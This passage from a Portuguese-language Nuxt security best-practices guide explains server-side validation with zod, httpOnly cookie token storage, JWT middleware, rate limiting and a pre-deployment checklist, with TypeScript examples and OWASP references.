  await $fetch('/api/users', { body: form.value })
}

// Atacante pode enviar diretamente:
// curl -X POST /api/users -d '{"email": "malicious"}'
```

### Regra de Ouro

> **SEMPRE validar no servidor. Validação do cliente é apenas UX.**

### Implementação Correta

```typescript
// 1. Schema compartilhado (domain)
// app/modules/auth/domain/validators.ts
import { z } from 'zod'

export const createUserSchema = z.object({
  email: z.string().email('Email inválido'),
  name: z.string().min(3).max(100),
  password: z.string().min(8)
})

export type CreateUserData = z.infer<typeof createUserSchema>
```

```typescript
// 2. Validação no cliente (UX)
// app/modules/auth/presentation/composables/useUserForm.ts
import { createUserSchema } from '../../domain'

export function useUserForm() {
  const form = ref({ email: '', name: '', password: '' })
  const errors = ref<Record<string, string>>({})

  // Validação cliente = feedback rápido
  function validate(): boolean {
    const result = createUserSchema.safeParse(form.value)
    if (!result.success) {
      errors.value = result.error.flatten().fieldErrors
      return false
    }
    errors.value = {}
    return true
  }

  return { form, errors, validate }
}
```

```typescript
// 3. Validação no servidor (OBRIGATÓRIA)
// server/api/users.post.ts
import { z } from 'zod'

// Mesmo schema ou mais restritivo
const createUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(3).max(100).trim(),
  password: z.string().min(8)
})

export default defineEventHandler(async (event) => {
  const body = await readBody(event)

  // SEMPRE validar no servidor
  const result = createUserSchema.safeParse(body)

  if (!result.success) {
    throw createError({
      statusCode: 400,
      message: 'Dados inválidos',
      data: result.error.flatten()
    })
  }

  // Dados seguros
  const { email, name, password } = result.data

  // Continuar com lógica de negócio...
})
```

### O que validar no servidor

| Validação | Cliente | Servidor |
|-----------|---------|----------|
| Formato (email, CPF) | ✅ UX | ✅ **Obrigatório** |
| Tamanho | ✅ UX | ✅ **Obrigatório** |
| Campos obrigatórios | ✅ UX | ✅ **Obrigatório** |
| Unicidade (email existe?) | ❌ | ✅ **Obrigatório** |
| Autorização | ❌ | ✅ **Obrigatório** |
| Rate limiting | ❌ | ✅ **Obrigatório** |
| Sanitização | ⚠️ | ✅ **Obrigatório** |

---

## Autenticação e Tokens

### Onde Armazenar Tokens

| Local | XSS | CSRF | Recomendação |
|-------|-----|------|--------------|
| localStorage | ❌ Vulnerável | ✅ Seguro | **Não usar** |
| sessionStorage | ❌ Vulnerável | ✅ Seguro | **Não usar** |
| Cookie httpOnly | ✅ Seguro | ❌ Vulnerável* | **Recomendado** + CSRF |
| Memory (ref) | ✅ Seguro | ✅ Seguro | SPAs, perde no refresh |

### Implementação Segura

```typescript
// server/api/auth/login.post.ts
export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const user = await validateCredentials(body.email, body.password)

  if (!user) {
    throw createError({ statusCode: 401 })
  }

  const token = generateJWT(user)

  // Cookie seguro
  setCookie(event, 'auth_token', token, {
    httpOnly: true,      // Não acessível via JS
    secure: true,        // Apenas HTTPS
    sameSite: 'strict',  // Proteção CSRF
    maxAge: 60 * 60 * 24 * 7,
    path: '/'
  })

  return { user: { id: user.id, name: user.name } }
})
```

```typescript
// server/middleware/auth.ts
export default defineEventHandler((event) => {
  const publicRoutes = ['/api/auth/login', '/api/auth/register']
  if (publicRoutes.some(route => event.path.startsWith(route))) {
    return
  }

  const token = getCookie(event, 'auth_token')

  if (!token) {
    throw createError({ statusCode: 401 })
  }

  try {
    event.context.user = verifyJWT(token)
  } catch {
    throw createError({ statusCode: 401 })
  }
})
```

---

## Rate Limiting

### Configuração

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  security: {
    rateLimiter: {
      tokensPerInterval: 100,
      interval: 60000
    }
  },
  routeRules: {
    '/api/auth/login': {
      security: {
        rateLimiter: {
          tokensPerInterval: 5,
          interval: 60000 // 5 tentativas por minuto
        }
      }
    }
  }
})
```

### Rate Limiting Manual

```typescript
// server/utils/rateLimit.ts
const store = new Map<string, { count: number; resetAt: number }>()

export function rateLimit(ip: string, limit: number, windowMs: number): boolean {
  const now = Date.now()
  const record = store.get(ip)

  if (!record || now > record.resetAt) {
    store.set(ip, { count: 1, resetAt: now + windowMs })
    return true
  }

  if (record.count >= limit) {
    return false
  }

  record.count++
  return true
}

// server/api/sensitive.post.ts
export default defineEventHandler((event) => {
  const ip = getRequestIP(event) || 'unknown'

  if (!rateLimit(ip, 10, 60000)) {
    throw createError({
      statusCode: 429,
      message: 'Muitas requisições'
    })
  }

  // Processar...
})
```

---

## Checklist de Segurança

### Antes do Deploy

- [ ] **HTTPS** obrigatório
- [ ] **nuxt-security** instalado e configurado
- [ ] **nuxt-csurf** instalado para CSRF
- [ ] **CSP** configurado corretamente
- [ ] **Headers de segurança** ativos
- [ ] **Rate limiting** em endpoints sensíveis
- [ ] **Validação server-side** em todos os endpoints
- [ ] **Tokens em cookies httpOnly**
- [ ] **Secrets não expostos** no cliente
- [ ] **Sourcemaps desabilitados** em produção
- [ ] **npm audit** sem vulnerabilidades críticas
- [ ] **Dependências atualizadas**

### Configuração de Produção

```typescript
// nuxt.config.ts
export default defineNuxtConfig({
  devtools: { enabled: process.env.NODE_ENV !== 'production' },

  sourcemap: {
    client: false,
    server: false
  },

  runtimeConfig: {
    jwtSecret: process.env.JWT_SECRET,
    public: {
      apiBaseUrl: process.env.API_BASE_URL
    }
  }
})
```

---

## Referências

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [nuxt-security](https://nuxt-security.vercel.app/)
- [nuxt-csurf](https://github.com/morgbn/nuxt-csurf)
- [Nuxt Security Best Practices](https://nuxt.com/docs/getting-started/security)
- [Vue Security Best Practices](https://vuejs.org/guide/best-practices/security.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
